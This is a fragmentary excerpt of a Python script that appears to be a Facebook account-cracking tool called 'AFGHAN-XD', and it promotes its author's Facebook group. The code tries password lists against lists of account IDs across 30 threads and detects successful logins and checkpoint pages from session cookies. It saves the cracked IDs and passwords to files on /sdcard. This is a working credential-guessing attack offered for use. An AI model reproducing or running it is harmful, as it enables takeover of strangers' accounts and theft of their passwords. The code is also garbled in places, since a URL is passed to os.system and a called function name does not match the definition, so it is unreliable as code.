...
try:
    ...
    pass
print('\33[1;32m  JOIN MY FACEBOOK GROUP')
...
try:
        ...
        os.system('pip install futures==2 && python AFGHAN.py')
...
+=========================================================+""")
os.system('https://www.facebook.com/profile.php?id=100000057577697')
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
...
def KHALID(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [AFGHAN-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AFGHAN=session.cookies.get_dict().keys()
                        if "c_user" in AFGHAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [AFGHAN-OK] %s • %s'%(ids,pas))
                                open('/sdcard/AFGHAN-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AFGHAN:
                                if 'y' in pcp:
                                        print#('\r\r\x1b[38;5;208m [AFGHAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AFGHAN-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                time.sleep(20)
        loop+=1
def AFGHAN2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [AFGHAN-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def AFGHANst():
    ...
    print(' Ids saved in AFGHAN-OK.txt,in cp AFGHAN-CP.txt')
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AFGHAN-OK] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/AFGHAN-OK.txt', 'a').write(cid+' • '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[AFGHAN-CP] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/AFGHAN-CP.txt', 'a').write(cid+' • '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[AFGHAN] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        for user in fo:
                                                ...
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(AFGHAN1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(AFGHAN2,ids,names,passlist)
                                                else:
